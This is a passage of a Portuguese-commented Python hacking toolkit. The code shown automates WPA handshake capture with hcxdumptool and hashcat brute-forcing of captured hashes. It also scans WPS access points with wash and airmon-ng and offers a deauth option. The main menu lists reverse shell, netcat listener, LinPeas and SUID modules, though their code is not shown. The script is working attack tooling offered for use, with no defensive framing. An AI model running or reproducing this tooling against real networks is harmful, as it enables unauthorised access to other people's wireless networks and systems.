            print('\033[7;31mO arquivo "WifiCrack/*.hc22000" não foi encontrado, deixe o DUMP por mais tempo.\033[m')
            exit()


        ## implementaçao definir a forma de quebra de hash

        for hash in dump.splitlines():
            nome_hash = hash.split('*')
            with open(f'WifiCrack/{nome_hash[3]}.hc22000','w') as f:
                f.write(hash)
            print()                
            print(nome_hash[3])
            print('#################################################################################################################')
            os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?d?d?d?d?d?d?d?d | tee WifiCrack/{nome_hash[3]}.result")
        
            #with open(f'WifiCrack/{nome_hash[3]}.result','r') as f:
            #    result = f.read()
            #    if 'Exhausted' in result:
            #        os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?h?h?h?h?h?h?h?h | tee WifiCrack/{nome_hash[3]}.result")



            #em caso de erro:
            #sudo ifconfig wlxd03745fbcadc down && sudo iwconfig wlxd03745fbcadc mode managed && sudo ifconfig wlxd03745fbcadc up
            #sudo ifconfig wlp4s0 down && sudo iwconfig wlp4s0 mode managed && sudo ifconfig wlp4s0 up

    def wifi_crack():

        ###########################
        ## VERIFICA DEPENDENCIAS ##
        ###########################
        dependencias = ["hcxdumptool", "hcxpcapngtool", "hashcat", 'xterm']

        for programa in dependencias:
            if not os.popen(f'which {programa}').read():
                os.system(f"sudo apt install {programa}")

        interface = interfaces()

        ################################
        ## EXCLUI O CONTEUDO ANTERIOR ##
        ################################
        os.popen('sudo rm -rf WifiCrack 2>/dev/null')
        t.sleep(1)
        os.system('mkdir WifiCrack')

        sitwifi = input('Já existe o arquivo "Wificrack/hash.hc22000"? (S/N) ')
        if sitwifi.lower() == 's':
            magic_crack()
        elif sitwifi.lower() == 'n':
            minutos = int(input('\033[7;31mQuantos minutos deseja realizar o DUMP? \033[m'))

            ################################
            ## EXCLUI O CONTEUDO ANTERIOR ##
            ################################
            os.popen('sudo rm dumpfile* essidlist hash.hc22000 2>/dev/null')

            ####################################
            ## INTERROMPE OS SERVIÇOS DE REDE ##
            ####################################
            os.system('sudo systemctl stop NetworkManager.service')
            os.system('sudo systemctl stop wpa_supplicant.service')
            
            try:
                #####################################
                ## CAPTURA DADOS DURANTE 5 MINUTOS ##
                #####################################
                t.sleep(2)
                os.system(f'sudo hcxdumptool -i {interface} -o dumpfile.pcapng --active_beacon --enable_status=15 --tot={minutos} ')
            except KeyboardInterrupt:
                pass
            
            #############################################################################
            ## CASO CANCELE ANTES DO TERMINO DO PROCESSO, RESTAURA OS SERVIÇOS DE REDE ##
            #############################################################################
            if KeyboardInterrupt:
                os.system('sudo systemctl start NetworkManager.service')
                os.system('sudo systemctl start wpa_supplicant.service')

            
            ##################################
            ## RESTAURA OS SERVIÇOS DE REDE ##
            ##################################
            os.system('sudo systemctl start NetworkManager.service')
            os.system('sudo systemctl start wpa_supplicant.service')
            input('Pressione para continuar')

            magic_crack()

        else:
            print('Entrada inválida.')
            input(press)
            main()

    def wifi_scan():
        def scan(s):
            os.system('rm wash')
            os.system(f'sudo wash -i {s} -s -a | tee wash ')
            ('')
            os.system('clear')
            with open('wash', 'r') as file:
                choose_bssid(file.read(),s)
        def deauth():
            pass
        def choose_bssid(wash_output,s):
            lines = wash_output.strip().split('\n')
            print('\nNUM   BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID')
            for i, line in enumerate(lines[2:], start=1):
                print(f"\033[0;34m[{i}]\033[m - {line}")

            selected_number = int(input("\nEscolha o número do BSSID desejado: "))

            if 1 <= selected_number <= len(lines) - 2:
                bssid = lines[selected_number + 1].split()[0]
                print(f'''\nBSSID escolhido: \033[7;33m{bssid}\033[m
    \nO que deseja fazer?

    \033[0;34m[1]\033[m - Deauth
    \033[0;34m[2]\033[m - WPSCrack
    \033[0;34m[3]\033[m - Em breve
    \033[0;34m[4]\033[m - Em breve
    \033[0;34m[5]\033[m - Em breve
    \033[0;34m[0]\033[m - Sair
    ''')
                options = {
                1: deauth,
                #2: host_discovery,
                #6: http_finder,
                #7: link,
                #8: auto_web,
                0: lambda: print('Volte sempre! ¯\_(ツ)_/¯') or quit
                }

                opcao = int(input('Escolha uma opção: '))
                funcao = options.get(opcao)

                if funcao:
                    funcao()
                elif opcao > 24:
                    print('Digite uma opção válida!')
                    input("Pressione Enter para continuar...")


            else:
                print("Número inválido. Tente novamente.")

        print('\nEste codigo irá usar SUDO algumas vezes ...\n')
        aircrack = os.popen("dpkg -l | grep aircrack | awk '{print $2}'").read()
        bully = os.popen("dpkg -l | grep bully | awk '{print $2}'").read()
        os.system('sudo systemctl restart NetworkManager.service')
        if "aircrack" in aircrack and "bully" in bully:
            ifaces = os.popen("ip a | grep BROADCAST | awk '{print $2}' | sed 's/://'").read()
            num = 1
            for iface in ifaces.split():
                print(f' \033[0;34m[{num}]\033[m - {iface}')
                num += 1

            sit_iface = int(input('\nEscolha uma interface para continuar: '))
            p = "'{print $2}'"
            if 1 <= sit_iface <= len(ifaces.split()):
                selected_iface = ifaces.split()[sit_iface - 1]
                sit_iface = os.popen(f"iwconfig {selected_iface} | grep Monitor ").read()
                if 'Mode:Monitor' in sit_iface:
                    scan(selected_iface)
                else:
                    print('Colocando IFACE em modo Monitor.')
                    os.popen('sudo airmon-ng check kill').read()
                    os.popen(f'sudo airmon-ng start {selected_iface}')
                    t.sleep(2)
                    selected_iface = os.popen(f"ip a | grep {selected_iface} | awk {p} | sed 's/://'").read()
                    sit_iface = os.popen(f"iwconfig {selected_iface} | grep Monitor 2>/dev/null").read()
                    if 'Mode:Monitor' in sit_iface:
                        scan(selected_iface)
            else:
                print("Número inválido.")
        else:
            os.system('sudo apt install aircrack-ng bully -y')
    wifi_crack()
    
#################################################
## CRIA UM BANNER COM MENU DAS OPÇÕES DE TESTE ##
#################################################
def banner():
    try:
        os.system("clear")
        print(bann)
        print(''' MENU:

 \033[0;34m[1]\033[m - Host Discovery
 \033[0;34m[2]\033[m - Hostname Resolve
 \033[0;34m[3]\033[m - Port Scanner
 \033[0;34m[4]\033[m - NC GET
 \033[0;34m[5]\033[m - WebFinder
 \033[0;34m[6]\033[m - WebCrawler
 \033[0;34m[7]\033[m - AutoWeb
 \033[0;34m[8]\033[m - WifiHacking
 \033[0;34m[9]\033[m - BackUp
 \033[0;34m[10]\033[m- Clonar Part|Disk
 \033[0;34m[11]\033[m- CronTab
 \033[0;34m[12]\033[m- Finder
 \033[0;34m[13]\033[m- EnumLinux Auditor
 \033[0;34m[14]\033[m- Config Tool
 \033[0;34m[15]\033[m- LinPeas
 \033[0;34m[16]\033[m- LinEnum
 \033[0;34m[17]\033[m- Potemkin
 \033[0;34m[18]\033[m- Waza
 \033[0;34m[19]\033[m- SUID
 \033[0;34m[20]\033[m- NC Listen
 \033[0;34m[21]\033[m- Reverse Shell
 \033[0;34m[22]\033[m- Server TCP
 \033[0;34m[23]\033[m- ServerHTTP
 \033[0;34m[24]\033[m- Tryeres
 \033[0;34m[0]\033[m - Sair
''')
        options = {
        1: host_discovery,
        2: hostname_resolv,
        3: bigscan,
        4: nc_get,
        5: http_finder,
        6: link,
        7: auto_web,
        8: wifi_hacking,
        9: backup,
        10: clonar,
        11: cron,
        12: finder,
        13: infosys,
        14: config,
        15: linpeas,
        16: linenum,
        #17: Potenkin,
        18: waza,
        19: suid,
        20: nc,
        21: reverse_shell,
        22: serverhttp,
        23: serverhttp,
        24: lambda: os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py') or main,
        0: lambda: print('Volte sempre! ¯\_(ツ)_/¯') or quit
        }

        opcao = int(input('Escolha uma opção: '))
        funcao = options.get(opcao)

        if funcao:
            funcao()

        elif opcao > 24:
            print('Digite uma opção válida!')
            input("Pressione Enter para continuar...")
            main()

    except ValueError:
        print('Digite uma opção válida!')
        input(press)
        main()


################################
## FUNÇÃO PRINCIPAL DO CÓDIGO ##
################################
def main():

    try:
        banner()

    except (KeyboardInterrupt):
        print('\n'+Ctrl_C)

    except ValueError:
            print('Digite a opção correta.')
            input('(Pressione qualquer tecla para continuar)')
            main()


##############
## EXECUÇÃO ##
##############            
main()
